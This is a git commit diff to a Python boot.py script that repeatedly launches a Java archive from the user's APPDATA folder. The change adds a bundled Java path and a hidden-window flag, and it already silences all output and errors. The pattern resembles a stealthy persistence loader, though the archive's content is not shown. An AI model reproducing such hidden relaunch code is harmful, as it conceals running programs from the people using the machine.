37994c9e9cea9a6b0e68e6613496900c867f4304
mousetech307 <duplikalt.100k5@gmail.com>
2026-08-18 10:14:47 +0300

    boot.py

--- boot.py
+++ boot.py
@@ -1,21 +1,17 @@
 import subprocess
 import os
 import time
-import sys
 
-if len(sys.argv) > 1:
-    java_path = sys.argv[1]
-else:
-    java_path = "java"  # visszaesés, ha nincs argumentum
-
+JAVA_PATH = os.path.join(os.getenv("APPDATA"), "Boot", "jdk", "bin", "java.exe")
 JAR_PATH = os.path.join(os.getenv("APPDATA"), "Boot", "mod.jar")
 
 while True:
     try:
-        subprocess.Popen([java_path, "-jar", JAR_PATH],
+        subprocess.Popen([JAVA_PATH, "-jar", JAR_PATH],
                          cwd=os.path.dirname(JAR_PATH),
                          stdout=subprocess.DEVNULL,
-                         stderr=subprocess.DEVNULL)
+                         stderr=subprocess.DEVNULL,
+                         creationflags=subprocess.CREATE_NO_WINDOW)
     except:
         pass
     time.sleep(5)
